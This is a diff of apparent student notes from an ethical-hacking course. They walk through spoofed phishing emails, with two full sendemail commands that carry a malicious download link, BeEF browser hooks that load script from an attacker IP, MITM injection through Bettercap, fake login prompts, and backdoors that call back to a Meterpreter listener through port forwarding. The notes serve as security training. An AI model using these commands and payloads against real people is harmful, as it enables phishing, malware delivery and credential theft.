@@ -1010,7 +1010,8 @@ You have now fully completed the **Client Side Attacks** section!
 ### <span style = "color: #569cd6">Spoofing Emails - Setting Up an SMTP Server</span>
 
 ### **The Big Picture: The Delivery Problem**
-You have spent the last few lectures building a sophisticated "digital weapon" (the Trojan). However, a weapon is useless if it sits on your own computer. You need a way to get it onto the victim's machine *and* convince them to open it.
+You have spent the last few lectures building a sophisticated "digital weapon" (the Trojan). However, a weapon is useless if it sits on your own computer. You need a way to get it onto the victim's machine *and* convince them to open it. 
+**SMTP Server**: Simple Mail Transfer Protocol Server
 
 The instructor introduces **Email Spoofing** as the solution. This is a form of Social Engineering where you pretend to be someone the victim trusts.
 
@@ -1032,9 +1033,11 @@ This is the most critical technical lesson in this lecture. You cannot just use 
     * **The Problem:** These servers are used by thousands of scammers every day. Gmail, Outlook, and Yahoo have "blacklisted" these servers.
     * **The Result:** If you use them, your email goes straight to the **Spam/Junk folder**. The victim will never see it.
 
+=> 2 solutions: using a web hosting plan or using an email service
+
 * **The "Pro" Way (Dedicated SMTP):**
     To get into the **Inbox** (Primary tab), you need a "clean" reputation.
-    * **The Solution:** Sign up for a legitimate **Email Marketing Service** (like SendGrid, Brevo, or Mailgun). These are companies used by real businesses (like Uber or Spotify) to send newsletters.
+    * **The Solution:** Sign up for a legitimate **Email Marketing Service** (like SendGrid, **Brevo**, or Mailgun). These are companies used by real businesses (like Uber or Spotify) to send newsletters.
     * **Why it works:** Because these companies ban spammers and verify users (via phone number), Gmail and Outlook trust their servers. If you send your fake email through them, it looks legitimate to the spam filters.
 
 ### **3. Setting Up the Infrastructure**
@@ -1086,6 +1089,11 @@ The instructor uses Dropbox to host the malicious file, but he uses a specific U
 #### **Tone and Context**
 Because the attacker is pretending to be a friend (`m.askar`), the tone is casual ("Hey man..."). If they were pretending to be a bank or a boss, the tone would be formal. Matching the tone is crucial for the disguise.
 
+```bash
+sendemail -xu hehe@gmail.com -xp matkhau -s smtp-relay.sendinblue.com:587 -f "fake@lala.org" -t "victim@lala.org" -u "title of the email" -m "Hey! I have something to tell you! download this now! http://www.dropbox.com/s/nsp404bdef.cute.zip?dl=1"
+```
+
+
 ### **3. The Current Limitation**
 * **What works:** The email arrives in the Inbox (not Spam) and shows the spoofed email address (`m.askar@isecurity.org`).
 * **What's missing:** Most email clients display a **Sender Name** (e.g., "Mohammad Askar") next to the email address. Currently, our email just shows the raw email address.
@@ -1118,6 +1126,10 @@ The command is now split into three logical parts:
 2.  **Compose (Content):** `-t [Target] -u [Subject] -m [Body]` (Writing the email).
 3.  **Spoof (Fake):** `-f [FakeEmail] -o message-header="From: Name <FakeEmail>"` (Lying about the sender).
 
+```bash
+sendemail -xu hehe@gmail.com -xp matkhau -s [smtp server]smtp-relay.sendinblue.com:587 -f "fake@lala.org" -t "victim@lala.org" -u "title of the email" -m "Hey! I have something to tell you! download this now! http://www.dropbox.com/s/nsp404bdef.cute.zip?dl=1" -o messgae-header="From: Homie <fake@lala.org>"
+```
+
 ### **2. The Result**
 When the victim receives this email:
 * **Sender Name:** "Mohammad Askar" (Perfect match).
@@ -1133,6 +1145,7 @@ The instructor ends with a crucial warning. This attack is powerful, but it **do
 
 * **The Vulnerability:**
     The attack works because **many organizations (claimed 80%) do not set up DMARC correctly**.
+<easydmarc.com/tools/dmarc-lookup>
     * *The Test:* The instructor visits a DMARC checker website. He types in the target domain (`zsecurity.org`). The result shows "No DMARC record found."
     * *The Meaning:* This means `zsecurity.org` has **no guest list**. Anyone on the internet can pretend to be them, and email servers will accept it.
 
@@ -1156,7 +1169,7 @@ In the previous lecture, you acted like a mailman carrying a letter to the post 
 ### **1. The Prerequisites**
 
 * **Free vs. Paid:** You generally **cannot** use free web hosting (like 000webhost). Free providers almost always block the "send email" function to prevent spammers.
-* **The Solution:** You need a **Cheap Paid Plan** (e.g., DreamHost, HostGator, Bluehost). Even the cheapest "Shared Hosting" plan ($3-5/month) works perfectly because it unlocks the PHP `mail()` function.
+* **The Solution:** You need a **Cheap Paid Plan** (e.g., **DreamHost**, HostGator, Bluehost). Even the cheapest "Shared Hosting" plan ($3-5/month) works perfectly because it unlocks the PHP `mail()` function.
 
 ### **2. The Setup: "The Robot" (`send.php`)**
 
@@ -1280,7 +1293,7 @@ In *this* lecture, the method is much more dangerous. By performing a **Man-in-t
 
 You cannot paste the entire BeEF hook code directly into the Bettercap configuration because it's too long. Instead, we use a small JavaScript file that acts as a loader.
 
-1.  **The File:** The instructor uses a file named `injectbeef.js`.
+1.  **The File:** The instructor uses a file named `inject_beef.js`.
 2.  **The Code:** This script simply tells the browser: *"Hey, create a new script element and load the resource located at `http://[Attacker_IP]:3000/hook.js`."*
 3.  **The Configuration:** You must open this file and change the IP address to your **Kali Linux IP** (e.g., `10.20.14.207`).
 
@@ -1298,7 +1311,7 @@ He edits the `payloads` line in the caplet file. The syntax used is:
   * **Path:** `/root/Downloads/injectbeef.js` (The file we prepared in Step 1).
 
 **The Final Config Line looks something like this:**
-`hstshijack.payloads = *:/root/Downloads/injectbeef.js`
+`set hstshijack.payloads  ...,*:/root/Downloads/inject_beef.js`
 
 ### **Step 3: Launching the Attack**
 
@@ -1337,8 +1350,8 @@ Now the trap is set. The instructor runs the attack in two stages using the term
 
 ### **Summary Checklist**
 
-1.  **Prepare:** Edit `injectbeef.js` with your Kali IP.
-2.  **Configure:** Edit `hstshijack.cap` to include the path to `injectbeef.js`.
+1.  **Prepare:** Edit `inject_beef.js` with your Kali IP.
+2.  **Configure:** Edit `hstshijack.cap` to include the path to `inject_beef.js`.
 3.  **Execute:** Run Bettercap with `spoof.cap` and then activate `hstshijack`.
 4.  **Verify:** Check the BeEF interface for the new hooked browser.
 
@@ -1383,7 +1396,7 @@ This is one of the most dangerous categories. These commands manipulate the brow
         * **Malware Delivery:** Redirect them to a page that says "Critical Update Required" which automatically downloads your Backdoor (Trojan).
 
 ---
-### <span style = "color: #569cd6">BeEF - Using Passwords Using A Fake Login Prompt</span>
+### <span style = "color: #569cd6">BeEF - Stealing Passwords Using A Fake Login Prompt</span>
 
 Here is the detailed explanation of the **Social Engineering Credential Harvester** lecture (often called the **"Pretty Theft"** module in BeEF).
 
@@ -1592,3 +1605,217 @@ Now that you have that Meterpreter session (the "shell"), what can you actually 
 * **Privilege Escalation:** How to go from a "User" to "Administrator/System".
 * **Keylogging:** Recording keystrokes to steal Facebook/Bank passwords.
 * **Pivoting:** Using the hacked computer to attack *other* computers on the same network.
+
+---
+
+GAINING ACCESS - HACKING OUTSIDE THE LOCAL NETWORK
+===
+
+### <span style = "color: #569cd6">Overview of The Setup</span>
+
+### **The Big Picture: Moving "Outside the House"**
+Up until now, you have been hacking devices on your own Wi-Fi. This is like shouting to someone in the same room—it's easy because you are close.
+
+Now, you want to hack someone in a different country (over the Internet). This introduces a problem: **How does the victim's computer find *your* specific laptop among the billions of devices on the internet?**
+
+### **1. The Networking Barrier: Private vs. Public IPs**
+To understand the solution, you must understand how your home network talks to the internet.
+
+
+
+* **Private IPs (Inside the House):**
+    * Every device in your home (Phone, Laptop, Kali machine) has a **Private IP** (e.g., `192.168.1.5`).
+    * **Crucial Rule:** These IPs are *invisible* to the internet. If you tell a victim in another country to connect to `192.168.1.5`, it won't work because that address only exists inside your house.
+
+* **Public IP (The Front Door):**
+    * Your Router has a **Public IP** (e.g., `85.23.11.4`). This is assigned by your Internet Service Provider (ISP).
+    * This is the *only* address the outside world sees. When you browse Google, Google thinks the request came from `85.23.11.4`, not your laptop's private IP.
+
+### **2. The Problem: The "Lost Delivery"**
+Imagine you send a Backdoor to a victim in another country.
+1.  **Configuration:** You tell the backdoor to connect back to your **Public IP** (`85.23.11.4`) because that's the only address they can find.
+2.  **The Connection:** The victim runs the file. The connection travels across the internet and hits your **Router**.
+3.  **The Drop:** Your Router receives a connection on Port 8080. It looks at your internal network (Phone, TV, Laptop, Kali) and asks: *"Who is this for?"*
+    * Since it doesn't know, **it drops the connection.** The hack fails.
+
+### **3. The Solution: Port Forwarding**
+**Port Forwarding** is a rule you write inside your Router's settings. It acts like a receptionist.
+
+* **The Rule:** *"Hey Router, if anyone from the internet knocks on **Port 8080**, send them directly to the **Kali Machine (192.168.1.5)**."*
+
+**With Port Forwarding enabled:**
+1.  Victim connects to **Public IP** on Port 8080.
+2.  Router checks its list: "Oh, Port 8080 goes to Kali."
+3.  Router **forwards** the traffic to your laptop.
+4.  **Success:** Your Metasploit listener receives the connection.
+
+### **4. Alternative Methods**
+The instructor notes that while Port Forwarding is the "classic" way, there are other modern ways to handle this if you can't access your router settings:
+* **Cloud Servers:** Running Kali on AWS or DigitalOcean (which have direct Public IPs).
+* **Tunneling Services:** Using tools like **Ngrok** or **Serveo** to create a temporary tunnel through the router without changing settings.
+
+---
+
+### <span style = "color: #569cd6">Ex1 - Generating a Backdoor That Works Outside The Network</span>
+
+### **The Main Challenge: The "Two-Address" Problem**
+In previous lectures, you hacked devices on your own Wi-Fi. This was easy because your Kali machine and the victim were in the same "room" (the same network).
+Now, you are hacking someone across the internet. This creates a dilemma:
+
+1.  **The Backdoor** needs to find your **Router** (Public IP).
+2.  **The Listener** needs to run on your **Kali Machine** (Private IP).
+
+This lecture explains why you must configure them differently.
+
+### **Step 1: Configuring the Backdoor (Public IP)**
+When you generate the payload with `msfvenom`, you must change the `LHOST`.
+
+* **The Setting:** `LHOST = [Your Public IP]`
+* **How to find it:** Google "What is my IP".
+* **The Logic:**
+    * Imagine you are mailing a letter to a friend in a different country. You cannot write "Room 3" (Private IP) as the return address; the post office won't know which building "Room 3" is in.
+    * You must write the **Street Address of the Building** (Public IP).
+    * The victim is on the internet. The only address they can see is your Router's Public IP. If you put your local IP (`192.168.x.x`) in the backdoor, the victim's computer will try to connect to *its own* local network and fail.
+
+### **Step 2: Configuring the Listener (Private IP)**
+This is where most students get confused. Even though the backdoor points to the Public IP, your listener **must** use the Private IP.
+
+* **The Setting:** `LHOST = [Your Local IP]` (e.g., `192.168.1.15`)
+* **The Logic:**
+    * The Listener software (`exploit/multi/handler`) runs on your Kali Linux machine.
+    * Your Kali machine **does not own** the Public IP; the *Router* owns the Public IP.
+    * Therefore, Kali cannot "listen" on the Public IP directly. It can only listen on its own network interface card, which has the Private IP.
+    * *Analogy:* You are waiting inside "Room 3" (Kali). You cannot wait at the "Building Front Desk" (Router). You must wait in your room.
+
+### **The "Disconnect"**
+So, we have a mismatch:
+1.  **The Victim** sends traffic to the **Router** (Public IP).
+2.  **You** are waiting at the **Kali Machine** (Private IP).
+
+Currently, the traffic hits the Router and stops because the Router doesn't know you are waiting. This is exactly why the instructor says the next step is **Port Forwarding**. You need to tell the Router (Front Desk) to send that specific traffic to "Room 3" (Kali).
+
+### **Summary Checklist**
+
+| Component | LHOST Setting | Why? |
+| :--- | :--- | :--- |
+| **Backdoor** (`msfvenom`) | **Public IP** | The victim on the internet needs to find your house (Router). |
+| **Listener** (`msfconsole`) | **Private IP** | You can only listen on the device you control (Kali). |
+
+---
+
+### <span style = "color: #569cd6">Configuring The Router To Forward Connections To Kali</span>
+
+### **The Objective: Opening the Door**
+In the previous lecture, we established the problem: The Router stops outside traffic from reaching your Kali machine.
+In this lecture, we solve that problem by configuring the Router to act as a **bridge** rather than a wall. This allows you to hack targets anywhere in the world (e.g., a Windows machine on a completely different network).
+
+### **Step 1: Accessing the Router (The Gateway)**
+To tell the router what to do, you must log into its settings page.
+
+1.  **Find the Router's IP:**
+    * The router is the "Gateway" to the internet.
+    * **Command:** Open a terminal and type `route -n`.
+    * **Look for:** The IP under the "Gateway" column (usually `192.168.0.1` or `192.168.1.1`).
+2.  **Login:**
+    * Type that IP address into your web browser (Firefox).
+    * Enter the username/password. (Check the sticker on the back of the router if you don't know it, or search for the default credentials for your router model).
+
+### **Step 2: The "Forwarding" Menu**
+Every router looks different, but the logic is always the same. You need to find the section responsible for routing traffic.
+* **Keywords to look for:** "Forwarding," "Port Forwarding," "Virtual Server," "NAT," or "Advanced Applications."
+* **The Goal:** You are looking for a table where you can add "Rules."
+
+### **Step 3: Creating the Rules**
+The instructor sets up **two** specific rules to enable the attack.
+
+#### **Rule 1: The Backdoor Connection (Port 8080)**
+This ensures that when the victim (infected with the malware) tries to "phone home," the call connects.
+
+* **Service Port (External/Public):** `8080`
+    * *Why?* This is the port we set in the backdoor payload (`LPORT`).
+* **Internal Port (Target):** `8080`
+    * *Why?* This is the port our Metasploit listener is watching.
+* **IP Address (Target IP):** `192.168.0.11` (Your Kali IP)
+    * *Why?* This tells the router: "Send this traffic specifically to the Kali laptop, not the TV or the phone."
+
+#### **Rule 2: The Delivery Service (Port 80)**
+This is optional but useful. It allows the instructor to host the malware on his own computer and let the victim download it directly from him.
+
+* **Service Port:** `80` (The standard HTTP web port).
+* **IP Address:** `192.168.0.11` (Your Kali IP).
+* **Result:** Now, your Kali machine acts like a public website. Anyone in the world who types your **Public IP** into their browser will see the files in your `/var/www/html/` folder.
+
+### **Step 4: The Proof of Concept**
+To prove this works, the instructor switches to a Windows machine connected to a **completely different network** (simulating a victim in another country).
+
+1.  **The Delivery Test (Port 80):**
+    * The victim opens a browser and types: `http://[Attacker_Public_IP]/backdoor.exe`.
+    * **Success:** The file downloads. This proves the router successfully forwarded the web traffic (Port 80) to the Kali machine.
+2.  **The Attack Test (Port 8080):**
+    * The victim runs `backdoor.exe`.
+    * **Success:** On the Kali machine, a `Meterpreter session` opens.
+    * **Note:** The connection shows it came from a "Public IP" (External) to the "Private IP" (Internal).
+
+### **Summary Checklist**
+1.  **Gateway IP:** Found using `route -n`.
+2.  **Login:** Accessed router settings via browser.
+3.  **Rule 1:** Forwarded Port **8080** to Kali (for the shell).
+4.  **Rule 2:** Forwarded Port **80** to Kali (for the download).
+5.  **Validation:** Victim on external network successfully connected back.
+
+---
+
+### <span style = "color: #569cd6">Ex2 - Using BeEF Outside The Network</span>
+
+### **The Goal: Hooking a Victim Across the World**
+In previous BeEF lectures, you hooked browsers on your own Wi-Fi. Now, we apply the "Port Forwarding" logic you just learned to hook a victim on a completely different network (the internet).
+
+The logic remains the same:
+1.  **The Hook (The Bait):** Needs to point to your **Public IP**.
+2.  **The Router (The Gate):** Needs to let the traffic in.
+3.  **The Listener (The Trap):** BeEF running on your Kali machine.
+
+### **Step 1: Configuring the Hook**
+BeEF provides a default hook script (usually pointing to `127.0.0.1` or your local IP). This won't work for an outside victim.
+
+1.  **Edit the File:** The instructor modifies the `index.html` file in `/var/www/html/`.
+2.  **Change the IP:** He replaces the local IP with his **Public IP** (found via "What's my IP" on Google).
+    * *Why?* When the victim loads the page, their browser needs to know where to send the data. It can only find your Public IP.
+3.  **The Result:** The script line looks roughly like:
+    `<script src="http://[PUBLIC_IP]:3000/hook.js"></script>`
+
+### **Step 2: Port Forwarding for BeEF**
+Unlike the backdoor which used Port 8080, BeEF operates on **Port 3000**. You must add a specific rule for this.
+
+* **Log into Router:** Go to the router's IP (Gateway).
+* **Add Rule:**
+    * **External Port:** 3000
+    * **Internal Port:** 3000
+    * **Internal IP:** `192.168.0.11` (Your Kali machine).
+* **Verify:** Now, when the router receives traffic on Port 3000, it sends it straight to BeEF.
+
+
+### **The Alternative: DMZ Host (The "Lazy" Method)**
+The instructor introduces a shortcut called **DMZ** (Demilitarized Zone).
+
+* **What it is:** Instead of manually forwarding ports one by one (80 for Web, 8080 for Backdoor, 3000 for BeEF), you tell the router: **"Send ALL incoming traffic from the internet to this one specific computer."**
+* **How to set it up:**
+    1.  Find the "DMZ" setting in your router.
+    2.  Enter your Kali machine's Local IP (`192.168.0.11`).
+    3.  Enable it.
+* **Pros:** It is instant. You never have to configure a port rule again. Everything works immediately.
+* **Cons (Security Risk):** It completely exposes your Kali machine to the internet. Since *every* port is open, if your Kali machine has a vulnerability, hackers on the internet can attack *you* easily. It removes the router's firewall protection for that specific machine.
+
+### **Summary of the Rules**
+
+| Setting | Port Forwarding | DMZ Host |
+| :--- | :--- | :--- |
+| **Traffic** | Forwards only specific ports (e.g., 80, 3000). | Forwards **ALL** ports (0-65535). |
+| **Security** | High (Firewall still blocks other ports). | Low (Machine is fully exposed). |
+| **Setup** | Tedious (One rule per tool). | Fast (One rule for everything). |
+
+### **Final Course Status**
+You have now completed the **Network Configuration** module!
+* You understand Public vs. Private IPs.
+* You can set up Port Forwarding rules.
+* You know how to use a DMZ for quick setups.
